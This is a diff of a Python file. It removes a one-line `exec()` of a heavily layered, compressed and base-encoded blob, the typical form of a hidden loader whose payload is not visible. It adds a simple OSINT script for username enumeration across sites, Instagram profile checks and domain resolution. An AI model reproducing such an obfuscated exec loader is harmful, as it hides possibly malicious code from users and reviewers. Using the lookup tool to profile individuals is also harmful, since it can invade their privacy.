@@ -1,2 +1,120 @@
-import base64,gzip
-exec(base64.b85decode(base64.b64decode(base64.b32decode(base64.b16decode(gzip.decompress(b'QZQOYQbtBnRcuB{QC4h4QB^rhRxo5nO>9<7RBLcpQ$<!<Qbkr%RWM{pQdCM+Q!qJ0R%>iZO)yqYRcmlmQZYq(QbkTrQEX^RR#ZwwR540RRWM{vQbkf!RaS6WQ&m=4R#h=iRcua5Ra8nwQ87kgS4Ct`Q7~3URaQ<#QZQ^<QdKcdQ*2g9QC4hKQZYtTRxo5zO>9y`RaQz=QZPzHRz+4)Q*2I1RBKLER8=)YRWM{vQ87|VRclIGQ&v`CR#kLPQ7}?SS5#6~Q!z$MRcmZoO)yeWR4__bQ$<!`Rz)#SQEX01R%=F8R8=uyRcmZoPDNHmR4{N>Q&nquQblx5RWM3OR%=p5QZYtTS8HrxQEXCFR8~r1Q&w6<QbkTrS8Q5HPE|@(QB^TvS5<6AS5{I&R90|PQZZ|KR#jwEQ*2~PRclH{Q!z?YRz+-2Q7}?SR4{N>QZO)jQdMM6S8QlXR8&$`QZYthRaI<PQEXO7RBTR2QZO)jQdM+PO>0_7QEO5~Q7|!KS4C(?QbkruR8@3HQZYp^QdL$@QEX^PPE}4-QC3P*S5;_3QEXODRaQz>QZZF|Rz^-!RcuO0QdVq6R8=`cR#jw9O)*kLRaQ!2QZaBtRz*2aQ!r9UR90+7Q7}0}Rz+l1S5;C*Ra8nyQZQ^`Rz^-wQEX&NQ&dV-R8~e|RaIm{S8P&JRcua3Q$<EvRz*fqQ!q|QRclT~Q7|=ORcmZlQ7}?ORa8nwQZaBtQdMM6RcvrdRBKK~Q!p`8Rz+k^S5{I&R8~$!Q&w6-QdMMAQEY5UQB+DsQ&vV(RWNK;O>0tAR4{N>QhHWHRz^loS8Q-dQB+PvQ!z$URz+-5S5{I^RaS6WQ&li9Qbk5jQ7~FcR#Z||QB^fdRz+-DO)*kTR4__eQ&llxR#j|MQ!q|RQB+PvQdUMwR%>ihPDWBlR8>k^Q$<!<Qblx6S8QlVRBJ|7Q7|=3QblA^O>9y~RBLoZQ&w6;QbjRORcuB`RBKX2QC3D%R%>ipO>0t4Ra8nvQ&m-YRz-AEQ*2sFR%=Q|R8=udQdMY2Q7}?eRa8nwQ&vSVR#i?=Q!q+OQ)@~^Q&lxnR#j|DS5{U;RBUimQ$<EvQdLe*O>0_6PE}GyR8~q<QZQ^wQEXODR4`6MQ&wwwR#kLTRcum9S8GmHRWLC_Rz+k|S5;O{RBTFDQ$<C2Rz)#TQEXC3Rcl67R8=r}QEO;IS5{I)RBKK|QZPzFRz^-vRWMdcQ)@<6Q7|=2RaI<CS8GyERBTFDQZQOWQbtBkQEXaBR%=dHQdKo!S5<6MO)*wVRcmloQ&v?lQblA=O>0s}RBKLEQZY(XR%>ilO>9<9RclU2QZZIxQdKciQ*3ZbS8Gm1RWLPFQblM&S8P&HRBLcyQ&vhtRz+-6QEXaBQfo>@R4_S9S5<6bQEXC1RcmlrQ$<=sRz-AEQEW~~Ra8zzQ&lxnRxo5?QEO62R8~$#Q&v?lQdLe*RcuyBQ)@~^Q7|z?QblZ5O>0(6RBTR2Q&vhvQblxAQ7~jkPE|@)Q7}0}S8HQ2Q7}?QR4{N@Q&w6+R#jF{Rcu;HQdCMtQZO`mQZQsrO)*kTRaQz`Q&n0;Qbkr$O>0(2QEN_CR8=`lQdMkLS5{U=RBK9AQZZ~=Rz^lnQ*2g9Q)^O2QdUM&S5<6BQ889TRaJ0TQZYp^QbtZtQ7}$OR8&$`QZY(HRaIm|Q7}?cR4{N^Q&lxYQbtBlQ7}?UR#Z|}QdKoWRaIn4O>0(2RBLcmQhHKaQbjpWQ*2~NQfp2{QZO}PS4CuDQEXO3RcuOGQZYq(R#i?<Q7~FcQfo>@Q&vh$Qfq8hS8P^BRcmxbQ&m=4Rz-AARWMpgQdV$9RaQnzS5;_6O>9z3Ra8nyQZQ98Rz*2eRWMRYQfo>@QdUYtQdMMAQEXO9R4{ZzQZZUXR#h=iRWMdcR#Zw=QC3PrRWM{nQEXODRBLclQ&vhuQdL${Q*3ZZRa8<{R8=r}QEOyZQ7~3SRclI8Q&n0+Qbkr$S8Q5HR#Z||Q&lxoQ7~*yPDN5iRclIAQZY(IR#jwARcu;FRaS6CQB^rhS8HTXQ87|XRBTFBQZPngQbjRNO>0(2PDD;dQdKcaR%>ieQ87|NR4{ZyQZO|`Rz)#WQ*3ZZRBKLEQ!qJ1QblA!S5{I`RBTFGQ&nqvQblx9O>0g_R8&q@Q7}0}S4Ct>O>9<5RcmlnQ&m-YQblY|Rcum7R%=p4Q!p`9QZQsoQbkryRcmxZQ&w<7R#j|JQEYHXQdCk^QB^fzS4C_~QEOI6RclU1QZZUZQdKciQ*2I2QEN&@R8=)oRcmBUO>0(6R4{N-Q&w<7Rz*2ZS8PT|Qfp2{RaQzwQEO~hQEOIARcuODQ&m-ZR#j|IQ*2U7QdCk^Q7|-lQ7~vnQEXCBR8~$yQ&vhvQbkryS8P^DRBK9AQC3PzS5;#$O)yeKRcmxcQ$<xUQbtZwQEXO9Ra8z^Q87wORz+l5S5{I`RBB2_QZPj@QblA>QEYHZQfpF0QZYtUQ7~**QbkfyRaJ0TQhHH(QdMkIQ*25~QdVq6QdKomRWM{vQEXO7RaS6PQZO(uR#h=iS8QxZR#ZwwR4_GRS5;_7Q889TRclT}Q$<=sRz*%yS8P^DQ)^CDQB^TvS8HrqPDN5gR8@3EQ&np)Rz+4%Q*25~RBK9BQdUYtQEOu`O)*kVRaQz^QZZUZQbkr$RcvTTQB+b^QZO-LS8HrnQC3n)R8??RQhHH(QbtBkRWMFSQdCYxR8=uyR%>idPDWNrRaJCEQ&m+kRz+-6Q7}qKS5|OERaG@qQfp*GQbkf!RclU2QZY(HRz+4)Q*25~RclT~Q7|xhQEO~gS8GyERaQz^Q$<C3R#kLPQ!q|QR#Z|&Q7|z>R%>iaQEXCBR8&evQ&v?lRz+4)RcuO1Q&dVtQdUYsRxo5oQC3n+RcuOOQZZUXR#kLQS8QxZQdV$QR8=uyS4C(>PDN5mR4{N=QZPk&R#j|HS8QxZRBKK}QZY(PRaInKPDWNrR4{ZyQ&m=4Qblx5Q7}?SS8GaDQ7|=ARWM{iS5{I;RBLckQZZIqRz*foQ7~jkR8&qyQC3PsQ7~jyS8P&LRBUizQ&v@ZQbtZvQ!r9UR8&e;R8~quRWNK;O>9y|R8??RQ&ntQQbkTqRWM{oR90+NQ7|<`Qfp*OQEXO9RBTFDQ&vV=R#i?<S8Q5JR#tFDQB^flS4Ct~QC3n!RaS6eQ&w<9R#jwARcvrdS5#6}Q!qJ8R#js$Q7~3YR90|SQZZ|KR#h=hRcvHQQB+b@QB^ThR%>KoQbkrsRaQz_Q&np)Rz)#VO>0(4Qfo$5R8=uUS8HTOO>9<5RBK9BQ$<C2Rz+-3QEYHXS8GmHR8=r}Qfq8dS5{I;RclIEQZO(uRz*%vRWMpeQ&w<ARWLD2RWM{uPDN5uR90|UQZZUYQbk5jRWM3OQ)^O2QZYtTR#jwDO)*kPR4{Z%QZQOXQbkr!Q*2sDR8&qyQdK!aRxoHrS8G;8R8~$zQ$<=sQbkr%RcvfXQC4t9Q&llTS8HTeO>9y`RBLckQZQOXQdMMAQEX^RR8&evQdKoeR#j|TO)yeaR4__YQ&w6;Rz^lnS8Ps5R#tFDQ!p`0S5<6BQ889TR8??RQhHWHQbkTsQ7}qMQdVq6Q!qJ9QEOycO)yqORaJ0TQZR5tRz+4$RcvrbQ&dV-RWLD2S5;(MO)yeKR8~q@QZZ|KQbkr%QEXC3PE|@pRaG@aQdMk9PDN5kR4__aQ&v@aRz+4%Q7~FaQEO60Q7|<_RaI<KS8P^BRBKK{Q&wzYRz+-3Q7}$PQENt4R8=`cRaIj!S5;O_R8??UQZPzHRz)#WRcvHRR#Z+^QZPA7S8HfSO>0(6RcuOHQ&n(6R#i??Q!q|QRBKX3QZY(PR%>H1QEXO7RBB2@QZQ^<QbtZwQ!rLaS5|OURWLDOS8HTLQbkfoR90|QQZO||QbkTrQ!q+NQEN_BQ!z?RQdML}QEOI8R8??QQZO|{QdM+MRcua5Q&dt_QdUY!S5;(TQC3n=RcmlrQZPzHRz*2eQ7}qKR%=RDQZY(IQZQssQbkfwR8??NQ&n0*Rz*foQEYHZRBKX2R4_49RaI<SO)yeaR8~q@Q&m=4QbtZwRcvHPRa8nvQ&llUQfp*JPDN5sRcmxaQ&n0+QbtZrRWMpgR%=F9Q&lxYQblA^PDWBrR8??OQZY(IRz-A9RcuyBQ)^0AQ!p`9Qfq8ZO>0&}RBTFCQZPj@Rz-A9Q!rLYQEO5~Q&lljR%>ilS8GyIRcuOHQ$<BEQbjROQ7}qKR%=F8QdKoWR%>KdO>9<1R8~r1QZZF9QdL$^Q!r#nQB+bzR4_41RcmNQS8P&FR90|PQZQ^<QdL${Rcum7PDD;dQ!z?QRcmZcPDN5mRaJCEQ$<C2Rz+k`QEX&MQdCk!Q87wORWM{zQEOICR8@3EQ&vSVQdKchRcvTVS5|CAR4_S9Rz+k|S5{U=RBLocQZPngQdLe)O>1OGQC4t9QZO}4QblY>QbkruRaQ<&QZPj@QdMM9O>0_8Ra8z@Q!p`9QEOyRQ7}?cRBK99Q&wzYQdL$`O>0g{S5|CQQZY(XS4C`AO)yqWR90|QQ&vV=QdMM7Q*2U5R90|RRWLPFQZQ&oQ7~3WRaJ0VQ&w6-QdKceQEY5TPDD~wQZO}BS8HrqO)*wXRBUirQZQ9|Rz*2ZQEWy@QC4tPQ&llcQfp*aQ889XRaJCDQZZF}R#j|LRcvTTS5!_$QZPA0QEO~QO)*wZRaQ<$Q&w6;QblA_Q7~3YQ&dt`QZO)iQdMX|O>0s}RaQz;Q&lxXR#j|HQ!q|SRa8nwQZY(XR%>H1Q889TR8~q?Q&v@ZQbtZwRWM3QQdCk!QC3PrR%>WSQEXO3R4__ZQ&wzYR#i?<Q!rLaS5|OVQ!p@jQEOyZQC3z&RclIDQZZ|JR#i?;Q!q+MRaR_8QZO-LS8HfOO)*wRR8??RQZZIxQbjpWS8QlXRcl67Q&lxXR#j|aQC3nyRaQ<%QZYthQblZ2QEW~~QEO5~R8~quS8HrmPDWBpR8??cQZR5tRz*2dO>0_8RBKK~Q!z?QRz+lCQbkfkRclI8QZZF|R#j|HQ7~FcRa8<%R4_DoQdMk9O)*kLRcuODQ&m=BRz*2ZO>0_8Ra8n<RaG@hS8HTbQEOIARaS6RQ&v@aRz)#VRcuB|Q&wz6R4_4AQ7~jiPDWNnRBKL0Q&w<8Rz+k_S8P^FRcl67R53<NRWM^QQ7~3cRclI9QZPzGQbjRNRWM{oQB+b^R8=&2Q7~viPDWBlRBB2{Q&vTKQbjRSQEY5TPDD~wRaQn}RaIn0PDWBpR4__fQZYtaR#jF`Q7}$OQdCMsQZO-LRaI<CS8GyCRBKK{Q&n0+QdMkFQEXO9Q&w<AQ&vhuQZQsfO)*kRRaJ0WQZQ>UQbkTrS8Ps5R#t39R8~e|S5;&~Q87|XR8>k^QZZ~{QbjpaRcuyBQEN&?QZO}CQEOu{QC3n=R8>w#QhHG^QbtBoQ7~jkPE|%#R8=)oS4C`6PDNHoRBTFCQ&lxWRz-A9QEXO7Qfo$5QZY(QQ7~jmPDN5iR90|RQ&li}Rz*2ZS8QZRS8GmHQZY(PRz+-DPDN5uR8~$!QZYq&R#j|IRcvrcQB+b!Q&vVyQZQs%S8G;ERaJ0UQ&vhsRz-ADS8QxbR#Zw=R8=`dQdML_Q889ZR8>w$Q&v`5Rz)#VQ*2U5Rclg4Q7|!KRWNKzQEOI2RcmxdQZZF9QbjpZS8Q-dR%=RDQ&vhuQEOycO>0t2RBUimQZYq&QdMkDRcum7Q&w<RQ&lljRWNKyPDWBnRaS6XQ$<=uQdMM9RcuB|Q&w<ARWLPSRxoHnS5{I;Rcua1Q&li|QbkTrQ!rXcR#Zw>QdKcwRaIz5QbkruRcuOCQ&vSVQblxARcum7Q)^CEQdKciRxoT%S5{I?RBTF9Q$<QcQbjpWRcvTTS5|CQRWU|XQ7~gMQ7}?cRcmxaQZY(IQbjROQ7}qLQEN^`Q!z?RQZQ^<S5{U;RaQ<zQ&m-ZQbtBlQ*2U5R%=p4QB^fdRcmZgO)*kTRcmxZQZZ|KR#i??Q*2sFQ&dt_Q7|z>RWM{uS8G;AR8>w#Q&vSVQbk5jQ*1^`Q&wzNQZO-LRz+k>QEXB|Ra8nwQ&m=BRz*%zQ*3BRQfo>@RaH4lRz+hmQEO5}R8??SQ&n(7QblY|Q*2~PS5|OURaQn!Q7~viO>9<3RaS6RQZZIxRz+-2QEY5UQdVqLQ!z$MRWNK)O>0t0RBK9MQ&li|QbtBjQEX01Q&dt#R4_41S4Ct`Qbkf!RaJ0UQ&wwvQdM+MRWMpeR8&e;RWLb2RWM{%QC3n&R8~q?QZaBsR#h=iQEX00QC4tPQ&lxXR%>KhPDWBtRBTR0QZZ~{QdM+MQEXO7S8Gy5Q&lxgQfp{NS5{I~RBKK{QZQ^`Rz+4)O>0_6QC4t9Q7|!7QblA!PDNHoRaJ0RQ&w6+Rz*%yQ!r9WS5!__R8=`dQZQsrO)yeUR8~q=Q&n(6Rz^-!Q*2~NRa8n<Q7}0~QblA!O>9<1R90|OQ&vTKQbtZsQ!r9URclT~RaH4dR#jw9S5;O>R4`6QQZYthRz^lpQ!rLaQ)^B|RaG@aQ7~*)O>0s{R8~$!QZZF9QblY}Q7~FaQEN(7QZYtMQEOyEPDWNpR8~q_Q$<C2R#j|MQ*2sDRa8<|Q7}0~QEOu`S8Gy6RBB2^Q&n(8QdL$^Q!rXcQdCYwR8~qvQblY^S8P^FRaJ0UQ&vhuR#h=jQ7}qMR8&qyRaG@iQblA+S5;C@R8>wyQ&vhuRz-ADQ*3BTQdV$AQ!q74RcmZgPDNHsRaQ<#Q$<C3Rz+k}QEW;|Qfo$5Q!z?IRWNKuO)*wVRcuOGQZY(HRz*2ZS8QZRS5|OUR8=)ZQ7~j$S5{I^RBB2`QZO|`Rz*%yRcu;FS8Gm1R8=udQdMMDS8P&LR4{Z!Q&wwvQblA>O>0t0R#Z+!R8=ucRz+k>QbkfoRBUizQ$<xUQdKceQ*2U7RBK9ARWLb2S8HTiS5{I)RaQz_Q&n0;QbkrzS8Pg3Q&w<BQ7}16S5<6BQ87|PR8~q-Q$<E$QbjpXQEW;`R8&$$QB^TSQZQsfS8GyCRBK9AQ$<E$Rz*fmQ!r9WS8Gy5Q&llTRz+k}QbkfwRBLodQZaBuQbjRRQ!q|QQ&dt_Q!p`1QZQ^*PDWBjRBB2{Q&wwwR#j|JQEYHZQ)^CDQ&lxfS5<6JQbkroR8>w$Q&n(8QdKchS8QxbQ)^B|RWLO~Q7~jiS8Gy2R8>k+QZPk1P*gBEP*gBI'))))))
+import os
+import json
+import requests
+import socket
+from concurrent.futures import ThreadPoolExecutor
+from time import sleep
+
+def banner():
+    print("\033[32m")
+    print(r"""
+ ███████x╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
+ ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
+ ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
+ ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
+ ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
+ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+
+                                    ─────── OSINT TOOLKIT ───────
+    """)
+    print("\033[0m")
+
+
+def check_username(site, url, username):
+    try:
+        full_url = url.format(username)
+        res = requests.get(full_url, timeout=5)
+
+        if res.status_code == 200 and "not found" not in res.text.lower():
+            return (site, full_url, True)
+        else:
+            return (site, full_url, False)
+
+    except:
+        return (site, url.format(username), False)
+
+
+def username_search():
+    username = input("\nEnter username: ")
+
+    with open("sites.json") as f:
+        sites = json.load(f)
+
+    print(f"\nSearching for '{username}'...\n")
+
+    results = []
+
+    with ThreadPoolExecutor(max_workers=15) as executor:
+        futures = [
+            executor.submit(check_username, site, url, username)
+            for site, url in sites.items()
+        ]
+
+        for future in futures:
+            results.append(future.result())
+
+    for site, url, found in results:
+        if found:
+            print(f"\033[32m[+] FOUND on {site}: {url}\033[0m")
+        else:
+            print(f"\033[31m[-] Not found on {site}\033[0m")
+
+
+def instagram_lookup():
+    user = input("\nEnter Instagram username: ")
+
+    url = f"https://www.instagram.com/{user}/"
+    headers = {"User-Agent": "Mozilla/5.0"}
+
+    res = requests.get(url, headers=headers)
+
+    if res.status_code != 200:
+        print("Failed to fetch profile")
+        return
+
+    if '"username"' not in res.text:
+        print("User not found or blocked")
+        return
+
+    print("\n[+] Profile exists")
+    print(f"[+] Profile URL: {url}")
+
+
+def domain_lookup():
+    domain = input("\nEnter domain: ")
+
+    try:
+        ip = socket.gethostbyname(domain)
+        print(f"[+] Domain: {domain}")
+        print(f"[+] IP Address: {ip}")
+    except:
+        print("[-] Could not resolve domain")
+
+
+def menu():
+    while True:
+        print("""
+[1]. Username Search
+[2]. Instagram Check
+[3]. Domain Lookup
+[4]. Exit
+""")
+
+        choice = input("Select option : ")
+
+        if choice == "1":
+            username_search()
+        elif choice == "2":
+            instagram_lookup()
+        elif choice == "3":
+            domain_lookup()
+        elif choice == "4":
+            break
+        else:
+            print("Invalid option")
+
+
+if __name__ == "__main__":
+    os.system("clear")
+    banner()
+    menu()
